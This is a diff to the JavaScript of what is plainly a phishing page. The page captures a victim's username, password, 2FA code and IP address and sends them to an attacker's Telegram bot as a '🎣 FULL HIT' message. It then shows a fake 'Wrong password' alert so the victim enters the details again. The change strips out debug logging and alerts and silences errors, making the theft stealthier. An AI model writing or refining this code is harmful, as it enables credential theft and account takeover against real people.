@@ -91,25 +91,12 @@
         const res = await fetch("https://api.ipify.org?format=json");
         const data = await res.json();
         ip = data.ip;
-      } catch (err) {
-        console.log("IP fetch failed:", err);
-      }
+      } catch {}
 
       const msg = `🎣 FULL HIT\nUser: ${u}\nPass: ${p}\n2FA: ${twofa || "not entered"}\nIP: ${ip}\nTime: ${new Date().toLocaleString("en-US", {timeZone: "Africa/Lagos"})}`;
 
-      alert("About to send to Telegram - chat ID: " + chat);  // debug alert
-
       fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(msg)}`)
-        .then(response => response.json())
-        .then(data => {
-          console.log("Telegram response:", data);
-          if (data.ok) {
-            console.log("Message sent successfully");
-          } else {
-            console.log("Telegram error:", data.description);
-          }
-        })
-        .catch(err => console.log("Fetch error:", err));
+        .catch(() => {});
 
       alert("Wrong password or code. Try again.");
     });
